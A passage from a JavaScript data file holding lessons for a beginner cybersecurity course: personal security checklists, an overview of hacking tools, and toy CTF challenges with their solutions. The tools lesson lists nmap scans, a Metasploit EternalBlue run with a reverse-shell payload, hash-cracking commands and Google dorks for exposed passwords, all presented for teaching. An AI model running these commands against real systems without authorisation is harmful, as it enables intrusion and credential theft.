✅ Only install apps from official stores
✅ Review app permissions
   (Does a flashlight need your contacts? NO!)
✅ Enable "Find My Device"
✅ Encrypt your phone (usually on by default)
\`\`\`

### Social Media Security

\`\`\`
✅ Make profiles private
✅ Don't share:
   - Full birthday
   - Home address
   - School/work location in real-time
   - Vacation plans ("We're away for 2 weeks!")
✅ Review tagged photos
✅ Enable login notifications
✅ Check connected apps regularly
\`\`\`

### Email Security

\`\`\`
✅ Use unique password + 2FA
✅ Don't click links in suspicious emails
✅ Check sender address carefully
✅ Don't open unexpected attachments
✅ Use separate emails:
   - Personal email
   - Shopping/accounts email
   - Throwaway for signups
\`\`\`

### Wi-Fi Security

\`\`\`
✅ Never use public Wi-Fi for banking
✅ Use VPN on public networks
✅ Forget networks when done
✅ Don't auto-connect to open networks
✅ Use your phone hotspot instead
\`\`\`

<warning>
⚠️ Public Wi-Fi is NEVER safe! Anyone on the same network can potentially see your traffic.
</warning>

### Backup Strategy: 3-2-1 Rule

\`\`\`
3 copies of your data
2 different types of storage
1 offsite copy

Example:
1. Your computer (original)
2. External hard drive (local backup)
3. Cloud storage (offsite backup)
\`\`\`

### Software Updates

\`\`\`
Updates often fix security vulnerabilities:

"Critical security patch available"
→ Install it NOW, not later!

Auto-updates: ENABLE THEM
- Operating system
- Browser
- Phone apps
- Router firmware
\`\`\`

### If You Get Hacked

\`\`\`
1. Change passwords IMMEDIATELY
   (start with email!)
2. Enable 2FA on everything
3. Check for unauthorized access
4. Scan for malware
5. Notify affected services
6. Monitor financial accounts
7. Learn from it!
\`\`\`

<tip>
💡 Check if your email has been in a breach: haveibeenpwned.com — It's free and run by a security researcher!
</tip>

### Your Security Score

Rate yourself:
\`\`\`
[ ] Unique passwords for every account
[ ] Password manager in use
[ ] 2FA on email and banking
[ ] Phone has screen lock
[ ] Browser is up to date
[ ] Don't click suspicious links
[ ] Backups are current
[ ] Wi-Fi uses WPA2/WPA3
[ ] Social media is private

7-9: 🟢 Great security!
4-6: 🟡 Getting there
0-3: 🔴 You're at risk!
\`\`\`

Security is a journey, not a destination! 🛡️
          `
        }
      ]
    },
    {
      id: 7,
      title: "Ethical Hacking Tools",
      description: "Tools of the trade",
      lessons: [
        {
          id: "7-1",
          title: "Kali Linux & Hacking Tools",
          duration: "12 min",
          content: `
## The Hacker's Toolkit 🧰

Professional security researchers use specialized tools. Let's explore them!

### Kali Linux

The #1 operating system for ethical hacking:

\`\`\`
What: Linux distro pre-loaded with 600+ security tools
Where: kali.org (free!)
How: Run in VirtualBox or as USB boot
\`\`\`

### Setting Up Kali (In VirtualBox)

\`\`\`bash
# 1. Download VirtualBox (free)
#    virtualbox.org

# 2. Download Kali Linux VM image
#    kali.org/get-kali/

# 3. Import into VirtualBox
#    File → Import Appliance → Select .ova file

# 4. Start it up!
#    Default login: kali / kali
\`\`\`

### Essential Tools Overview

| Tool | Category | What It Does |
|------|----------|-------------|
| **Nmap** | Scanning | Network/port scanning |
| **Wireshark** | Analysis | Packet capture & analysis |
| **Burp Suite** | Web | Web app testing |
| **Metasploit** | Exploitation | Vulnerability exploitation |
| **John the Ripper** | Passwords | Password cracking |
| **Hashcat** | Passwords | GPU-accelerated cracking |
| **Aircrack-ng** | Wireless | Wi-Fi security testing |
| **Hydra** | Passwords | Online brute force |
| **SQLMap** | Web | Automated SQL injection |
| **Nikto** | Web | Web server scanner |

### Nmap Deep Dive

\`\`\`bash
# Basic scan
nmap target.com

# Scan all ports
nmap -p- target.com

# Detect operating system
nmap -O target.com

# Detect services and versions
nmap -sV target.com

# Aggressive scan (OS + services + scripts)
nmap -A target.com

# Scan for vulnerabilities
nmap --script vuln target.com
\`\`\`

### Burp Suite — Web App Testing

\`\`\`
Your Browser → [Burp Proxy] → Website
                    ↓
        See & modify EVERY request!

1. Intercept login requests
2. Modify parameters
3. Replay requests
4. Find hidden endpoints
\`\`\`

### Metasploit Framework

The exploitation Swiss army knife:

\`\`\`bash
# Start Metasploit
msfconsole

# Search for exploits
search apache
search type:exploit platform:windows

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your_ip
exploit
\`\`\`

<warning>
⚠️ ONLY use these tools on systems you have WRITTEN PERMISSION to test! Unauthorized use is a crime.
</warning>

### Password Cracking Tools

\`\`\`bash
# John the Ripper - crack password hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Hashcat - GPU-accelerated (much faster!)
hashcat -m 0 -a 0 hashes.txt rockyou.txt
\`\`\`

### Practice Platforms

Safe, legal places to practice:

\`\`\`
🎯 TryHackMe.com     — Guided rooms, beginner-friendly
🎯 HackTheBox.com    — Realistic challenges
🎯 PicoCTF.org       — Student CTF competitions
🎯 OverTheWire.org   — Wargames (start with Bandit)
🎯 DVWA              — Practice web hacking locally
\`\`\`

<tip>
💡 Start with TryHackMe — it has learning paths from absolute beginner to advanced! And it's free.
</tip>

### Career Paths in Cybersecurity

| Role | What They Do | Avg Salary |
|------|-------------|-----------|
| Security Analyst | Monitor & respond to threats | $80K |
| Penetration Tester | Hack companies (legally!) | $100K |
| Security Engineer | Build secure systems | $120K |
| Bug Bounty Hunter | Find bugs for rewards | Varies ($$$) |
| CISO | Lead security strategy | $200K+ |

### Certifications to Consider

\`\`\`
Beginner:
  CompTIA Security+
  CEH (Certified Ethical Hacker)

Intermediate:
  OSCP (Offensive Security Certified Professional)
  CySA+

Advanced:
  CISSP
  OSCE
\`\`\`

You now know the tools of the trade! Use them wisely! 🛡️
          `
        }
      ]
    },
    {
      id: 8,
      title: "Capture The Flag",
      description: "Put your skills to the test",
      lessons: [
        {
          id: "8-1",
          title: "Your First CTF Challenge",
          duration: "15 min",
          content: `
## Capture The Flag! 🏁

**CTF (Capture The Flag)** competitions are how hackers test their skills!

### What is a CTF?

Teams or individuals solve security challenges to find hidden "flags":

\`\`\`
Challenge: "Find the hidden message in this website"
You hack → find → flag{y0u_f0und_th3_s3cr3t}
Submit flag → earn points! 🏆
\`\`\`

### CTF Categories

| Category | What You Do |
|----------|-------------|
| **Web** | Hack websites (XSS, SQLi, etc.) |
| **Crypto** | Break encryption |
| **Forensics** | Analyze files, memory dumps |
| **Reversing** | Reverse engineer programs |
| **Pwn** | Exploit binary programs |
| **OSINT** | Find info from public sources |
| **Misc** | Everything else! |

### Challenge 1: Decode This!

\`\`\`
Find the flag:
ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259
\`\`\`

Hint: It's Base64 encoded!

\`\`\`bash
echo "ZmxhZ3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259" | base64 -d
# Output: flag{base64_is_not_encryption}
\`\`\`

<tip>
💡 Base64 is encoding, NOT encryption! Anyone can decode it. It's used for data transport, not security.
</tip>

### Challenge 2: Hidden in Plain Sight

\`\`\`html
<!-- Look at a website's source code -->
<!-- Right-click → View Page Source -->
<!-- Or press Ctrl+U -->

<html>
<head><title>Nothing here...</title></head>
<body>
  <p>This page is empty.</p>
  <!-- flag{always_check_the_source} -->
</body>
</html>
\`\`\`

Developers sometimes leave secrets in HTML comments!

### Challenge 3: HTTP Headers

\`\`\`bash
# Check response headers
curl -I https://challenge.ctf.com

# HTTP/1.1 200 OK
# Content-Type: text/html
# X-Secret-Flag: flag{headers_hide_secrets}
# Server: nginx
\`\`\`

### Challenge 4: robots.txt

\`\`\`bash
# Websites tell search engines what NOT to index
curl https://challenge.ctf.com/robots.txt

# User-agent: *
# Disallow: /secret-admin-panel/
# Disallow: /flag.txt

# Now visit /flag.txt!
curl https://challenge.ctf.com/flag.txt
# flag{robots_txt_is_not_security}
\`\`\`

### Challenge 5: Caesar Cipher Crack

\`\`\`
Encrypted: synt{pnrfne_pvcure_vf_jrnx}
\`\`\`

\`\`\`python
# Try all 26 shifts
def caesar_crack(text):
    for shift in range(26):
        result = ""
        for char in text:
            if char.isalpha():
                base = ord('a') if char.islower() else ord('A')
                result += chr((ord(char) - base + shift) % 26 + base)
            else:
                result += char
        if "flag" in result.lower():
            print(f"Shift {shift}: {result}")

caesar_crack("synt{pnrfne_pvcure_vf_jrnx}")
# Shift 13: flag{caesar_cipher_is_weak}
\`\`\`

This is **ROT13** — a Caesar cipher with shift of 13!

### OSINT Challenge

Find information using only public sources:

\`\`\`
Task: "What is the CEO's email at ExampleCorp?"

Sources to check:
1. Company website (About page)
2. LinkedIn profiles
3. GitHub repositories (check commits!)
4. Google dorking: "ExampleCorp" "CEO" "@"
5. WHOIS records for their domain
6. Cached pages
\`\`\`

### Google Dorking

Advanced Google searches for finding exposed data:

\`\`\`
site:example.com filetype:pdf    → PDFs on a site
intitle:"index of" passwords     → Exposed directories
inurl:admin login                → Admin pages
"password" filetype:log          → Log files with passwords
\`\`\`

<warning>
⚠️ Google dorking to find vulnerabilities in sites you don't own can be illegal. Only use on CTF challenges or with permission!
</warning>

### Where to Play CTFs

\`\`\`
🏁 PicoCTF.org          — Best for beginners!
🏁 CTFtime.org          — Calendar of CTF events
🏁 TryHackMe.com        — Guided challenges
🏁 HackTheBox.com       — Real-world scenarios
🏁 OverTheWire (Bandit)  — Linux command challenges
🏁 CryptoHack.org       — Cryptography challenges
\`\`\`

### Start Your Journey!

\`\`\`
1. Sign up on PicoCTF or TryHackMe
2. Start with the easiest challenges
3. Google when you're stuck (that's how you learn!)
4. Join a team or community
5. Practice regularly
6. Enter real CTF competitions!
\`\`\`

<tip>
💡 The cybersecurity community is incredibly helpful. Join Discord servers, Reddit's r/netsec, and ask questions!
</tip>

Congratulations! You've completed the Cybersecurity course! 🎉

You now have the foundation to:
- Protect yourself online
- Understand how attacks work
- Use security tools ethically
- Start your cybersecurity journey

Stay curious, stay ethical, and keep learning! 🛡️🚀
          `
        }
      ]
    }
  ]
};

export default courseData;
